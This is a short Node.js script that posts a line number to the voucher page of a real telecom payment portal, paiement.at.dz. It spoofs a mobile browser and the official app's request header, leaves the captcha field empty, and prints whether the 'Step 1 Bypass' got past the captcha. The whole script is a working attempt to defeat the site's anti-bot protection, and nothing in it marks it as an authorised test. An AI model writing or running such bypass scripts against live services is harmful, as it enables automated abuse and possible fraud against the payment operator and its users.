const https = require('https');
const querystring = require('querystring');

async function testStep1() {
    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36',
        'X-Requested-With': 'dz.algerietelecom.rd.e_paiement',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Referer': 'https://paiement.at.dz/index.php?p=voucher_internet'
    };

    const postData = querystring.stringify({
        'nd': '038421000',
        'userCode': '',
        'validerADSL': 'Valider'
    });

    const options = {
        hostname: 'paiement.at.dz',
        path: '/index.php?p=voucher_internet',
        method: 'POST',
        headers: {
            ...headers,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    console.log('📡 Testing Step 1 Bypass...');
    return new Promise((resolve) => {
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                const isStep2 = data.includes('voucher') || data.includes('vcode');
                const hasCaptchaError = data.includes('incorrect') || data.includes('Captcha');
                console.log('Status:', res.statusCode);
                console.log('Is Step 2 reached:', isStep2);
                console.log('Captcha Error present:', hasCaptchaError);
                if (isStep2 && !hasCaptchaError) {
                    console.log('✅ SUCCESS! Captcha bypassed in Step 1.');
                } else {
                    console.log('❌ FAILED. Captcha still required.');
                }
                resolve();
            });
        });
        req.on('error', e => { console.error(e); resolve(); });
        req.write(postData);
        req.end();
    });
}

testStep1();
